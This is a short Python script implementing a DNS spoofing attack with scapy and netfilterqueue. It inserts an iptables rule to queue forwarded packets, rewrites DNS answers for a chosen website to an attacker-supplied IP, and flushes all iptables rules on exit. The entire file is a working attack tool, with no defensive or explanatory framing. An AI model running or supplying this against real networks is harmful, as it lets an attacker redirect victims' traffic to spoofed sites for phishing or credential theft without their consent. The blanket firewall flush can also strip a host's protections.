#!/usr/bin/env python
import argparse
import netfilterqueue
import scapy.all as scapy
import subprocess


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-w", "--website", dest="website", help="Web site to spoof")
    parser.add_argument("-i", "--ip", dest="ip", help="Host ip")
    options = parser.parse_args()
    return options


def create_queue():
    # targetting
    subprocess.call('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
    # local
    # subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
    # subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)


def remove_queue():
    subprocess.call('iptables --flush', shell=True)


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        # print(scapy_packet.show())
        if website in qname:
            print('[+] Spoofing target ' + qname)
            answer = scapy.DNSRR(rrname=qname, rdata=ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


args = get_arguments()
ip = args.ip
website = args.website

create_queue()
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print('\n[-] Detected CTRL + C ...... Resetting ip tables. Please wait ...')
    remove_queue()
